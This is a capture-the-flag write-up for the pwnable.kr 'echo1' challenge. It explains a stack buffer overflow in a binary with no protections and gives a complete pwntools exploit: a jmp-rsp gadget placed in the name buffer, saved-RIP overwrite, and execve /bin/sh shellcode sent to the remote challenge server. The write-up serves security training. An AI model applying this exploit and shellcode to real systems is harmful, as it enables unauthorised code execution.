---
layout: page
title: pwnable.kr - echo1
category: pwnablekr
subcategory: rookiess
tags: [writeup, pwn, pwnablekr]
---


Checksec:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```

Running binary:
```
hey, what's your name? : test

- select echo type -
- 1. : BOF echo
- 2. : FSB echo
- 3. : UAF echo
- 4. : exit
> 1
hello test
some_input
some_input

goodbye test

- select echo type - ...
```

We give name and then there is menu with only first option working - Buffer OverFlow.

First 4-th bytes of the name lands at constant address `0x6020a0 <id>`.

The code of "BOF echo":
```c
__int64 echo1()
{
  char s[32]; // [rsp+0h] [rbp-20h]

  func_array->print_hello(func_array);
  get_input(s, 0x80);
  puts(s);
  func_array->print_goodbye(func_array, 0x80);
  return 0LL;
}
```

As there are no security contermeasures the challenge is straight-forward:

* as the name give an asm code that will jump to a shellcode (`jmp rsp`)
* in echo1 function overwrite RIP with `<id>` address (first bytes of the name - they are executable)
* `jmp rsp` will execute
* at RSP there will be input we gave in `get_input`
* so we give the shellcode there

Exploit code:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
~Gros
'''

from pwn import *
import re
import argparse
import subprocess
from binascii import *


BINARY_FILE = './echo1'
REMOTE = ('pwnable.kr', 9010)

def setup_connection():
    binary, libc, preload = None, None, False
    local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
    task_libc = './libc.so.6'

    env = {}
    if args.PRELOAD:
        local_libc = task_libc
        env = {'LD_PRELOAD': task_libc}

    if args.BINARY:
        binary = ELF(BINARY_FILE)
        context.arch = binary.arch

    if args.REMOTE:
        if args.LIBC:
            libc = ELF(task_libc)
        s = remote(*REMOTE)
    else:
        if args.LIBC:
            libc = ELF(local_libc)
        
        s = process(BINARY_FILE, stderr=open('/dev/null', 'w+'), env=env)
        if args.GDB:
            context.terminal = ['gnome-terminal', '-e']
            breakpoints = [0x400871]
            gdb.attach(s, exe=BINARY_FILE, gdbscript='\n'.join(['b *'+str(x) for x in breakpoints]))
            
    return s, binary, libc


if __name__ == '__main__':
    s, binary, libc = setup_connection()

    context.update(arch = 'amd64')

    jump = asm('jmp rsp')

    payload = 'A'*40
    payload += p64(0x6020a0)  # saved rip - <id> address
    payload += asm('''xor rax,rax
                   push rax
                   mov rdi, 0x68732f2f6e69622f
                   push rdi
                   mov rdi, rsp
                   mov al, 0x3b
                   xor rsi, rsi
                   xor rdx, rdx
                   syscall'''
                )

    print(s.recvuntil("hey, what's your name? :"))
    s.sendline(jump)
    print(s.recvuntil('>'))

    s.sendline('1')
    print(s.recvuntil('hello ' + jump))

    s.sendline(payload)
    s.interactive()
```
